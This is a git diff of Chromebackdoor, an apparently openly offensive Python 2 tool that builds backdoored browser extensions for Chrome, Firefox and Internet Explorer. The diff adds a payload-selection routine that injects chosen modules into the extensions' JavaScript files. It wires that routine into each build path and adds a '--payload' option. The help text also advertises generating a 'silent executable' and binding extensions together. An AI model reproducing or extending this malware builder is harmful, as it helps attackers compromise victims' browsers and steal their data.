@@ -30,6 +30,59 @@ def logon():
       VERSION 3.0 - graniet75@gmail.com - @graniet75
     """
 
+def show_plugins(backdoor = ''):
+    print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Listing payloads..."
+    listing = glob.glob('backdoor/plugins/*.chromebackdoor')
+    current = 1
+    for line in listing:
+	if line != "":
+	    line = open(line).read()
+	    title = line.split('%title%')[1]
+	    print "["+bcolors.WARNING+"/"+bcolors.ENDC+"] "+str(current)+" -> " + title.split('%title%')[0]
+	    current+=1
+    user_input = raw_input("[?] please select numbers ? ")
+    if listing[int(user_input) - 1] != "":
+	module_content = open(listing[int(user_input) - 1]).read()
+	print "["+bcolors.OKBLUE+"*"+bcolors.ENDC+"]" + listing[int(user_input) - 1]
+	oned = ""
+	if oned == "":
+	    action = 0
+	    while action == 0:
+		if backdoor == "":
+		    user_input = raw_input('[?] backdoor folder ? ')
+	        else:
+		    user_input = backdoor
+		if user_input != '':
+		   if(os.path.isdir(user_input)):
+			if not user_input.endswith('/'):
+			    user_input = user_input + "/"
+			print "["+bcolors.OKBLUE+"*"+bcolors.ENDC+"] " + user_input
+			action = 1
+			if(os.path.isfile(user_input + 'iexplorer/script.js')):
+			    selected = "iexplorer"
+			    open_file = open(user_input + 'iexplorer/script.js').read()
+			    content = open_file.replace('//module',module_content +'\n//module').split('%content%')[1]
+			    content = content.split('%content%')[0]
+			    new_file = open(user_input +'iexplorer/script.js',"w")
+			    new_file.write(content+"\n//module")
+			    print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] backdoor iexplorer writed !"
+			elif(os.path.isfile(user_input + 'firefox/data/content.js')):
+			    selected = "firefox"
+			    open_file = open(user_input + 'firefox/data/content.js').read()
+			    content = open_file.replace('//module',module_content +'\n//module').split('%content%')[1]
+			    content = content.split('%content%')[0]
+			    new_file = open(user_input +'firefox/data/content.js',"w")
+			    new_file.write(content+"\n//module")
+			    print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] backdoor firefox writed !"
+			elif(os.path.isfile(user_input + 'server/js/check.js')):
+			    selected = "chrome"
+			    open_file = open(user_input + 'server/js/check.js').read()
+			    content = open_file.replace('//module',module_content +'\n//module').split('%content%')[1]
+			    content = content.split('%content%')[0]
+			    new_file = open(user_input +'server/js/check.js',"w")
+			    new_file.write(content+"\n//module")
+			    print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] backdoor chrome writed !"
+
 def logo():
     print """
       _                                                    
@@ -123,6 +176,7 @@ def iexplorer():
 	    file_write.close()
 	copy('backdoor/relais_bk/','backdoor/backdoor/relais/')
 	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Successfully configure."
+	show_plugins('backdoor/backdoor/')
 	name_archive = str(random.randint(1,99999))
 	shutil.make_archive(name_archive,'zip', 'backdoor/backdoor/')
 	shutil.rmtree('backdoor/iexplorer_bk')
@@ -355,6 +409,7 @@ def install_firefox_server():
 	    file_write.close()
 	copy('backdoor/relais_bk/','backdoor/backdoor/relais/')
 	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Successfully configure."
+	show_plugins('backdoor/backdoor/')
 	name_archive = str(random.randint(1,99999))
 	shutil.make_archive(name_archive,'zip', 'backdoor/backdoor/')
 	shutil.rmtree('backdoor/firefox_bk')
@@ -390,6 +445,7 @@ def install_relais(domain):
                     copy('backdoor/web','backdoor/backdoor/web/')
                     copy('backdoor/relais', 'backdoor/backdoor/relais/')
                     copy('backdoor/server', 'backdoor/backdoor/server/')
+		    show_plugins('backdoor/backdoor/')
 		    package('backdoor/backdoor/server/', outfile='backdoor/backdoor/backdoor')
 		    print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Write crx..."
 		    print "|   backdoor.crx writed."
@@ -410,8 +466,8 @@ def install_relais(domain):
 		domain = raw_input('['+bcolors.OKBLUE+'?'+bcolors.ENDC+'] Website hosted (https://localhost/)? ')
 	        if domain == '':
 			domain = "https://localhost/"
-    except:
-        print "\n Bye ^^"
+    except OSError as e:
+	print('Directory not copied. Error: %s' % e)
 
 def install_server_chrome():
     try:
@@ -454,8 +510,8 @@ def install_server_chrome():
             else:
                 print "not here"
         
-    except:
-        print "bye ^^"
+    except OSError as e:
+	print('Directory not copied. Error: %s' % e)
 
 def help():
 	print "["+bcolors.OKBLUE+"!"+bcolors.ENDC+"] Welcome to Chromebackdoor."
@@ -464,7 +520,7 @@ def help():
 	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] --chrome  : generate GoogleChrome backdoor"
 	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] --ie      : generate IE backdoor"
 	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] --build   : generate silent executable"
-	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] --plugins : show available plugins"
+	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] --payload : show available payloads"
 	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] --binder  : compact extension to extension"
 	print "--------------------------------------------"
 
@@ -478,6 +534,8 @@ def main():
 	    executable_silent()
 	elif(sys.argv[1] == "--ie"):
 	    iexplorer()
+	elif(sys.argv[1] == "--payload"):
+	    show_plugins()
 	else:
 	    help()
     else:
